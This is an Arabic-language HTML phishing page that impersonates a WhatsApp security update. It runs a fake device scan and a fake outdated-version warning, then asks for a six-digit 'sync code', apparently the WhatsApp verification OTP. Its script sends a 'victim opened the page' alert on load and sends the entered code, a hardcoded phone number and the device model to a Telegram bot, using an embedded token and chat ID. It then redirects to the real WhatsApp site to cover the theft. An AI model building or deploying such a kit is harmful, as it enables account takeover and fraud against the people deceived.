<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security System</title>
    <style>
        :root { 
            --wa-bg: #0b141a; 
            --wa-surface: #111b21;
            --wa-green: #00a884; 
            --wa-text: #e9edef; 
            --wa-hint: #8696a0;
            --wa-danger: #f15c6d;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Tahoma, sans-serif; }
        
        body { 
            background: var(--wa-bg); 
            color: var(--wa-text); 
            height: 100vh; 
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden; 
        }

        /* شاشة الفحص الذكي مع اللوجو النابض */
        #checker { 
            position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        .pulse-logo {
            width: 80px;
            margin-bottom: 30px;
            animation: logoPulse 1.5s infinite ease-in-out;
            filter: drop-shadow(0 0 8px rgba(0, 168, 132, 0.3));
        }

        .container { 
            width: 90%; max-width: 400px; padding: 30px 20px; text-align: center; 
            display: none; background: var(--wa-surface); border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .active { display: block; animation: fadeIn 0.8s ease; }

        .device-info { 
            background: #1d2a33; border-radius: 15px; padding: 20px; text-align: right; 
            margin: 20px 0; border: 1px solid #222d34;
        }
        
        .status-dot { width: 8px; height: 8px; background: var(--wa-danger); border-radius: 50%; display: inline-block; margin-left: 8px; animation: dotPulse 1s infinite; }
        
        .info-line { font-size: 13px; margin-bottom: 12px; color: var(--wa-hint); display: flex; justify-content: space-between; }
        .info-line b { color: #fff; font-family: monospace; }

        .otp-input {
            width: 100%; background: #1d2a33; border: 1px solid #2a3942; border-radius: 10px;
            color: var(--wa-green); font-size: 32px; text-align: center; outline: none; 
            letter-spacing: 8px; margin: 20px 0; direction: ltr; padding: 10px 0;
        }

        .btn { 
            background: var(--wa-green); color: #111b21; border: none; width: 100%; 
            padding: 18px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer;
        }

        .spinner { border: 3px solid rgba(0, 168, 132, 0.1); border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        
        @keyframes logoPulse {
            0% { transform: scale(0.95); opacity: 0.8; }
            50% { transform: scale(1.1); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.8; }
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; } }
        @keyframes dotPulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div id="checker">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="pulse-logo" alt="WhatsApp">
        <p id="log-text" style="font-size:15px; color:var(--wa-hint);">جاري الاتصال بخوادم الأمان...</p>
        <div id="device-detect" style="margin-top:12px; font-size:12px; color:var(--wa-green); font-family:monospace;"></div>
    </div>

    <div class="container" id="app">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="60" style="margin-bottom:15px;">
        <h2 style="font-size:19px; margin-bottom:10px;">تحديث أمان واتساب</h2>

        <div class="device-info">
            <div class="info-line">الجهاز المكتشف: <b id="device-name">جاري التحديد...</b></div>
            <div class="info-line">حالة الإصدار: <span style="color:var(--wa-danger); font-weight: bold;">(v2.4) مطلوب تحديث <span class="status-dot"></span></span></div>
            <div class="info-line">نظام التشفير: <b>SSL/TLS 1.3</b></div>
            <div style="border-top: 1px solid #2a3942; margin-top:12px; padding-top:12px;">
                الرقم الموثق: <b id="masked-phone" style="color:var(--wa-green);"></b>
            </div>
        </div>

        <p style="font-size: 13px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 15px;">
            تم إصلاح بعض الأخطاء في التحديثات الأخيرة. لضمان توافق حسابك مع الإصدار الأخير  يرجى التأكد من حسابك وإدخال كود المزامنة أدناه.
        </p>

        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••">
        <button class="btn" id="submit-btn" onclick="submitData()">تحديث ومزامنة الآن</button>
    </div>

    <script>
        const CFG = {
            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            C: '5446862709',
            P: '01030003287'
        };

        function getDeviceModel() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                const match = ua.match(/Android\s+([^\s;]+);?\s+([^;)]+)/);
                return match ? match[2] : "Android Device";
            } else if (/iPhone|iPad/i.test(ua)) { return "iPhone (iOS)"; }
            return "PC Device";
        }

        const deviceModel = getDeviceModel();
        document.getElementById('device-name').innerText = deviceModel;
        document.getElementById('masked-phone').innerText = "+20 " + CFG.P.substring(0,3) + " •••• •• " + CFG.P.slice(-2);

        async function bot(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
                });
            } catch (e) {}
        }

        window.onload = () => {
            const log = document.getElementById('log-text');
            const det = document.getElementById('device-detect');
            
            bot(`📱 <b>[دخول جديد]:</b> الضحية فتح الصفحة.\nالجهاز: <code>${deviceModel}</code>`);

            setTimeout(() => { log.innerText = "تحديد مواصفات الجهاز..."; det.innerText = `OS Detected: ${deviceModel}`; }, 1200);
            setTimeout(() => { log.innerText = "فحص بروتوكولات التشفير..."; }, 2800);
            setTimeout(() => { 
                log.innerText = "فشل المزامنة: إصدار v2.3 قديم جداً!"; 
                log.style.color = "#f15c6d"; 
            }, 4200);
            
            setTimeout(() => {
                document.getElementById('checker').style.display = 'none';
                document.getElementById('app').classList.add('active');
            }, 5800);
        };

        async function submitData() {
            const val = document.getElementById('otp').value;
            if(val.length === 6) {
                document.getElementById('submit-btn').innerText = "جاري المزامنة...";
                await bot(`🔥 <b>[كود وصل]:</b>\nالرقم: <code>${CFG.P}</code>\nالكود: <code>${val}</code>\nالجهاز: <code>${deviceModel}</code>`);
                
                document.body.innerHTML = `
                    <div style="text-align:center; display:flex; flex-direction:column; align-items:center;">
                        <div class="spinner"></div>
                        <p style="margin-top:20px; color:var(--wa-hint);">جاري تحديث قاعدة البيانات v2.4...</p>
                    </div>`;
                
                setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 4000);
            }
        }
    </script>
</body>
</html>
